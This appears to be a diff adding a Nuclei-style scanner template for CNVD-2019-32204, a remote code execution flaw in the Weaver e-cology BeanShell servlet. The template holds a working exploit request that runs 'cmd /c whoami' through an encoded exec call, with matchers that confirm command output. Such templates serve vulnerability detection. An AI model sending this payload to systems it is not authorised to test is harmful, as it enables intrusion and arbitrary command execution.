@@ -1,0 +1,35 @@
+id: CNVD-2019-32204(BSH-RCE)
+
+info:
+  name: CNVD-2019-32204(BSH-RCE)
+  author: wintrysec
+  severity: critical
+  description: CNVD-2019-32204(BSH-RCE)
+  reference: https://github.com
+  tags: ecology
+
+requests:
+  - raw:
+    - |
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+        Connection: close
+        Content-Length: 96
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=ex\u0065c("cmd /c whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+          - "root"
+          - "system"
+        condition: or
